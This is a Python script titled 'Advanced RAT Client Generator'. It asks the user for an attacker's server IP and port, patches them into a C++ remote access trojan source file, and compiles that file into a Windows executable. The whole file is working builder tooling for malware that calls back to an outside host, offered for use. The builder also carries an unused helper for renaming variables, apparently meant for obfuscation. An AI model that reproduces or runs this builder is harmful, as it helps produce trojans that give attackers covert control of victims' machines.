#!/usr/bin/env python3
import os
import sys
import subprocess
import tempfile
import shutil
import random
import string
from colorama import Fore, Style, init # type: ignore

# Initialize colorama
init()

def print_banner():
    print(f"""{Fore.GREEN}
██████╗  █████╗ ████████╗ █████╗ ████████╗ ██████╗ ██╗   ██╗██╗██╗     ██╗     ███████╗
██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗╚══██╔══╝██╔═══██╗██║   ██║██║██║     ██║     ██╔════╝
██████╔╝███████║   ██║   ███████║   ██║   ██║   ██║██║   ██║██║██║     ██║     █████╗  
██╔══██╗██╔══██║   ██║   ██╔══██║   ██║   ██║   ██║██║   ██║██║██║     ██║     ██╔══╝  
██║  ██║██║  ██║   ██║   ██║  ██║   ██║   ╚██████╔╝╚██████╔╝██║███████╗███████╗███████╗
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚══════╝╚══════╝
{Style.RESET_ALL}""")
    print(f"{Fore.CYAN}Advanced RAT Client Generator{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Generate customized RAT clients with advanced options{Style.RESET_ALL}\n")

def validate_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False
        except ValueError:
            return False
    return True

def validate_port(port):
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

def generate_random_string(length=8):
    """Generate a random string for variable renaming"""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def generate_client(options):
    # Source file path
    source_file = "simple_rat_client.cpp"
    
    if not os.path.exists(source_file):
        print(f"{Fore.RED}Error: Source file {source_file} not found!{Style.RESET_ALL}")
        return False
    
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()
    temp_file = os.path.join(temp_dir, "modified_client.cpp")
    
    try:
        # Read the source file
        with open(source_file, 'r') as f:
            content = f.read()
        
        # Check if the expected strings exist in the content
        ip_pattern = '#define SERVER_IP "'
        port_pattern = '#define PORT '
        
        if ip_pattern not in content:
            print(f"{Fore.RED}Error: Could not find SERVER_IP definition in source file!{Style.RESET_ALL}")
            return False
        
        if port_pattern not in content:
            print(f"{Fore.RED}Error: Could not find PORT definition in source file!{Style.RESET_ALL}")
            return False
        
        # Find the actual IP and PORT values in the source
        import re
        ip_match = re.search(r'#define SERVER_IP "([^"]+)"', content)
        port_match = re.search(r'#define PORT (\d+)', content)
        
        if ip_match:
            original_ip = ip_match.group(1)
            print(f"{Fore.YELLOW}Found original IP: {original_ip}{Style.RESET_ALL}")
            content = content.replace(f'#define SERVER_IP "{original_ip}"', f'#define SERVER_IP "{options["ip"]}"')
        else:
            print(f"{Fore.RED}Error: Could not extract original IP from source!{Style.RESET_ALL}")
            return False
            
        if port_match:
            original_port = port_match.group(1)
            print(f"{Fore.YELLOW}Found original port: {original_port}{Style.RESET_ALL}")
            content = content.replace(f'#define PORT {original_port}', f'#define PORT {options["port"]}')
        else:
            print(f"{Fore.RED}Error: Could not extract original port from source!{Style.RESET_ALL}")
            return False
        
        # Write to temporary file
        with open(temp_file, 'w') as f:
            f.write(content)
        
        # Verify the replacement worked
        with open(temp_file, 'r') as f:
            modified_content = f.read()
        
        if f'#define SERVER_IP "{options["ip"]}"' not in modified_content:
            print(f"{Fore.RED}Error: Failed to replace SERVER_IP in the modified file!{Style.RESET_ALL}")
            return False
            
        if f'#define PORT {options["port"]}' not in modified_content:
            print(f"{Fore.RED}Error: Failed to replace PORT in the modified file!{Style.RESET_ALL}")
            return False
        
        print(f"{Fore.GREEN}Successfully replaced IP and PORT in the source code.{Style.RESET_ALL}")
        
        # Compile the modified source
        print(f"{Fore.CYAN}Compiling...{Style.RESET_ALL}")
        
        # Determine the compiler command based on OS
        if os.name == 'nt':  # Windows
            # Add all required libraries for GDI+ and other Windows graphics
            compile_cmd = f'g++ -o "{options["output"]}" "{temp_file}" -lws2_32 -lgdiplus -lgdi32 -lole32'
        else:  # Linux/Mac (would need different libraries)
            print(f"{Fore.RED}Error: Compilation on non-Windows platforms not supported yet.{Style.RESET_ALL}")
            return False
        
        # Execute the compilation
        result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"{Fore.RED}Compilation failed:{Style.RESET_ALL}")
            print(result.stderr)
            return False
        
        print(f"{Fore.GREEN}Successfully compiled to {options['output']}{Style.RESET_ALL}")
        return True
        
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
        return False
    finally:
        # Clean up temporary directory
        shutil.rmtree(temp_dir)

def main():
    print_banner()
    
    # Default options
    options = {
        "ip": "",
        "port": "8888",
        "output": "rat_client.exe"
    }
    
    # Get user input
    print(f"{Fore.YELLOW}Enter the server details:{Style.RESET_ALL}")
    
    # Get and validate IP
    while True:
        options["ip"] = input(f"{Fore.CYAN}Server IP: {Style.RESET_ALL}")
        if validate_ip(options["ip"]):
            break
        print(f"{Fore.RED}Invalid IP address. Please enter a valid IPv4 address.{Style.RESET_ALL}")
    
    # Get and validate port
    while True:
        port = input(f"{Fore.CYAN}Server Port [8888]: {Style.RESET_ALL}")
        if port == "":
            port = "8888"
        if validate_port(port):
            options["port"] = port
            break
        print(f"{Fore.RED}Invalid port. Please enter a number between 1 and 65535.{Style.RESET_ALL}")
    
    # Get output filename
    output_name = input(f"{Fore.CYAN}Output filename [rat_client.exe]: {Style.RESET_ALL}")
    if output_name != "":
        options["output"] = output_name
    
    # Add .exe extension if not present
    if not options["output"].lower().endswith('.exe'):
        options["output"] += '.exe'
    
    # Generate the client
    print(f"\n{Fore.YELLOW}Generating client with the following settings:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Server IP: {options['ip']}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Server Port: {options['port']}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Output filename: {options['output']}{Style.RESET_ALL}")
    
    # Actually generate the client
    generate_client(options)

if __name__ == "__main__":
    main()






